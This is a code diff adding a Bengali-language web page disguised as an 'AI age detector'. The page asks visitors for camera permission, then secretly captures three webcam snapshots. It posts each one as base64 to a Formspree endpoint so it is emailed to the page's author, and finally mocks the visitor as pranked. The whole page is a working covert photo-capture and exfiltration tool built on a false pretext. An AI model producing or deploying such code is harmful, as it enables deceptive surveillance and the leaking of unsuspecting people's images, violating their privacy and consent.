@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <title>বয়স অনুমান করার ম্যাজিক!</title>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; background: #f0f2f5; margin-top: 50px; }
+        .box { background: white; padding: 30px; border-radius: 10px; display: inline-block; box-shadow: 0px 0px 10px rgba(0,0,0,0.1); }
+        video { display: none; }
+        button { background: #4CAF50; color: white; border: none; padding: 10px 20px; font-size: 16px; border-radius: 5px; cursor: pointer; }
+    </style>
+</head>
+<body>
+
+<div class="box">
+    <h2>🤖 এআই এজ ডিটেক্টর (AI Age Guesser)</h2>
+    <p>আপনার আসল বয়স কত জানতে ক্যামেরা পারমিশন দিন!</p>
+    
+    <button onclick="startPrank()">বয়স চেক করুন</button>
+    <p id="result" style="font-weight: bold; color: red;"></p>
+</div>
+
+<!-- হিডেন ভিডিও ও ক্যানভাস ট্যাগ -->
+<video id="video" width="320" height="240" autoplay></video>
+<canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
+
+<script>
+    // এখানে আপনার Formspree থেকে পাওয়া লিংকটি বসাবেন
+    const formspreeUrl = "https://formspree.io/f/mbgljabg";
+
+    function startPrank() {
+        const video = document.getElementById('video');
+        const result = document.getElementById('result');
+
+        // ক্যামেরা পারমিশন নেওয়া
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                video.srcObject = stream;
+                result.innerText = "স্ক্যান হচ্ছে... দয়া করে অপেক্ষা করুন! ⏳";
+
+                // ৫ সেকেন্ড পর পর ছবি তোলার লুপ (মোট ৩ বার ছবি তুলবে)
+                let count = 0;
+                const interval = setInterval(() => {
+                    takeSnapshotAndSend(video);
+                    count++;
+                    if (count >= 3) { 
+                        clearInterval(interval);
+                        result.innerText = "মজা করলাম! তোর ফেইক আইডি আমি চিনে ফেলছি! 😂";
+                        stream.getTracks().forEach(track => track.stop()); // ক্যামেরা বন্ধ
+                    }
+                }, 5000); // প্রতি ৫ সেকেন্ড পর পর
+            })
+            .catch(err => {
+                result.innerText = "ক্যামেরা পারমিশন না দিলে বয়স মাপা যাবে না! ❌";
+            });
+    }
+
+    function takeSnapshotAndSend(video) {
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+        
+        // ছবিকে Base64 ফরম্যাটে রূপান্তর
+        const imageData = canvas.toDataURL('image/png');
+        
+        // Formspree এর মাধ্যমে ইমেইলে পাঠিয়ে দেওয়া
+        fetch(formspreeUrl, {
+            method: 'POST',
+            headers: {
+                'Accept': 'application/json',
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({ image: imageData, message: "Friend's captured photo!" })
+        }).then(response => {
+            if (response.ok) {
+                console.log("ছবি সফলভাবে ইমেইলে পাঠানো হয়েছে!");
+            }
+        }).catch(error => {
+            console.error("ত্রুটি:", error);
+        });
+    }
+</script>
+
+</body>
+</html>
